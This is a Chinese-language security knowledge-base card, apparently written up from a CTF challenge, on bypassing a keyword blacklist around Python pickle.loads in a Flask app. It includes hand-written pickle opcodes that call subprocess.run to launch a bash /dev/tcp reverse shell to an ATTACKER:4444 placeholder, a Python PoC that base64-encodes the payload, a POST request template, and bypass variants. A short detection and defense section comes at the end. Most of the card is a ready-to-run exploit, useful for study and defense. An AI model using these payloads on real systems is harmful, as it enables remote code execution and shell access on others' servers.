---
id: web-python-deserialization-pickle-blacklist-miss-subprocess-run-opcode
title: pickle 黑名单漏掉 subprocess：手工 GLOBAL/REDUCE opcode 直接 subprocess.run("bash","-c",...) 反弹
type: scenario
domain: web
path: web/python/deserialization
technique: pickle-opcode-subprocess-run-blacklist-gap
tags:
- python
- pickle
- deserialization
- opcode
- subprocess
- blacklist-bypass
- flask
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W
  verified_at: '2026-11-08T17:18:28+08:00'
  notes: 已对照原文核对（黑名单原文无 subprocess、sys.modules[os]/[sys] 置 not allowed、csubprocess run + ((lp1 + Vbash/V-c/V命令 + a + t + R 手写 opcode、base64 后 POST /ppicklee 的 data 参数一致）；本次核对未读取图片，仅依据正文；原文给的是反弹 /dev/tcp/ip/port，卡中改为 ATTACKER:4444 占位；原文未验证 subprocess 是否已在 sys.modules，卡中把该判定点写明为条件
url: /docs/web/python/deserialization/web-python-deserialization-pickle-blacklist-miss-subprocess-run-opcode/
draft: false
kb_aliases:
- pickle.loads 黑名单绕过 subprocess
- csubprocess run opcode
- sys.modules os 被污染后的 pickle 绕过
- 手写 pickle opcode 执行命令
- pickle RCE 无 pker
---

## 一句话结论

Web 端 `pickle.loads(base64.b64decode(data))` 前做了两件事：把 `sys.modules['os']`/`['sys']` 置成字符串 `"not allowed"`，并对解码后的字节做关键字黑名单（`os`、`system`、`exec`、`__builtins__`、`pickle`、`class`、`mro` 等）。但黑名单里没有 `subprocess`，于是手写 `csubprocess\nrun` 的 GLOBAL opcode 取到 `subprocess.run`，再拼 `("bash","-c","bash -i >& /dev/tcp/IP/PORT 0>&1")` 参数并用 REDUCE 调用，即可在反序列化时执行命令——因为 `subprocess` 模块早已在 `sys.modules` 里（被 werkzeug/Flask 导入过），不再走被污染的 `import os` 路径。

## 原理

- `pickle` 的 `GLOBAL`（`c`）opcode 执行 `find_class(module, name)`，等价 `getattr(__import__(module), name)`；`REDUCE`（`R`）用栈上的元组当参数调用该 callable。整条链不需要 `__reduce__` 的类实例化路径，也不产生黑名单里的字符串。
- 黑名单是「对解码后的 payload 做子串匹配」，所以只要能不写出 `os`/`system`/`exec` 等词就能过。`csubprocess\nrun` 里没有这些子串（`subprocess` 不含 `os`）。
- `sys.modules['os'] = "not allowed"` 只在**之后**发生 `import os` 时生效。若 `subprocess` 已在 `sys.modules`（Flask/Werkzeug 运行期几乎必然已导入），`__import__("subprocess")` 直接返回缓存模块，模块内的 `os` 引用是它导入时绑定的真 `os`，因此命令执行不受污染影响。
- 反过来，如果环境冷启动且 `subprocess` 尚未导入，`import subprocess` 会执行模块体里的 `import os` 拿到字符串，导致 `AttributeError`——这正是该手法是否成立的判定点。
- 参数用 `('bash','-c','<cmd>')` 而不是单字符串：`subprocess.run` 在 `shell=False` 时把列表当 argv，避免依赖 shell 解析；要反弹 shell 就把 `bash -i >& /dev/tcp/...` 交给 `-c`。

## 触发条件

- 存在 `pickle.loads` 作用于用户可控数据（本例经 base64 解码），且反序列化在请求线程内同步执行。
- 黑名单是关键字子串匹配，且**没有**覆盖 `subprocess`（或 `posix`、`pty`、`ctypes` 等其它可执行面）。
- `subprocess` 模块在反序列化前已被进程导入（Flask/Werkzeug 场景通常满足）。
- 攻击者可控出网（反弹）或命令结果可外带（写文件、DNS、HTTP 回连）。

## 利用步骤

1. 读源码确认黑名单集合与 `sys.modules` 污染方式，注意黑名单是「匹配解码后的原始字节」而不是匹配反序列化结果。
2. 手写 opcode（也可用 pker 等价生成），只用 `c`（GLOBAL）、`p`（MEMOIZE/PUT）、`(`（MARK）、`V`（UNICODE）、`a`（APPEND）、`t`（TUPLE）、`R`（REDUCE）、`.`（STOP）：

```
csubprocess
run
p0
((lp1
Vbash
p2
aV-c
p3
aVbash -i >& /dev/tcp/IP/PORT 0>&1
p4
atp5
Rp6.
```

3. base64 编码后 POST 到入口（本例 `data=` 参数，路由 `/ppicklee`）。
4. 监听端口收 shell；把 `run` 换成 `check_output`/`Popen` 可取回显，或把命令改成 `cat /flag > /app/static/x.txt` 走静态目录回显。

## PoC

```python
import base64
opcode = b'''csubprocess
run
p0
((lp1
Vbash
p2
aV-c
p3
aVbash -i >& /dev/tcp/ATTACKER/4444 0>&1
p4
atp5
Rp6.
'''
print(base64.b64encode(opcode).decode())
```

```http
POST /ppicklee HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded

data=<base64>
```

## 变体与关联

- 变体：黑名单加了 `subprocess` 但漏 `posix`/`pty`/`platform`/`ctypes` 时，`cposix\nsystem` 同样成立（注意 `posix` 含 `os` 子串会被 `os` 关键字命中，需换成 `V`+切片或 `cdl\nopen` 类间接模块）。
- 变体：`sys.modules` 污染可用「先 `cdel\nsys.modules`」不成立（`del` 不在 opcode 里），常见解法是 `GLOBAL('sys','modules')` 取到 dict 后 `BUILD`/`SETITEM` 改回，或走 [[web-python-deserialization-pickle-sys-modules-self-rebind]] 的重绑思路。
- 变体：黑名单匹配解码后字节时，可用 pickle 协议里的 `SHORT_BINUNICODE`（`\x8c`）等二进制形式承载字符串，让 `os`/`system` 不出现在明文字节里。
- 关联：[[web-python-deserialization-pickle-sys-modules-self-rebind]]（`sys.modules['sys']` 被改后的重绑绕过，与本条的「模块未导入 vs 已导入」判定互补）。
- 关联：[[web-python-deserialization-pickle-pydoc-pipepager-short-blacklist-bypass]]（同为短黑名单绕过，走 `pydoc.pipepager`）。

## 检测与防御

- 防御：绝不 `pickle.loads` 不可信数据；需要传对象就换 JSON/MessagePack + 显式 schema 校验。
- 防御：必须用 pickle 时用 `RestrictedUnpickler.find_class` 白名单（只放行明确需要的类），而不是关键字黑名单——黑名单永远漏模块。
- 防御：不要用「污染 `sys.modules`」当安全措施，它不是隔离；进程降权 + 出网限制 + seccomp 才是有意义的兜底。
- 检测：请求体出现 base64 且解码后含 `c`/`R`/`.` opcode 特征（`csubprocess`、`cposix`、`cbuiltins`）；入口路由出现 `subprocess` 子进程与对外 4444/反弹连接；`sys.modules` 被写入非模块对象的异常日志。
- 响应：下线该入口、审计同进程其它反序列化点、轮换容器内凭据与 flag 所在环境的访问权限。
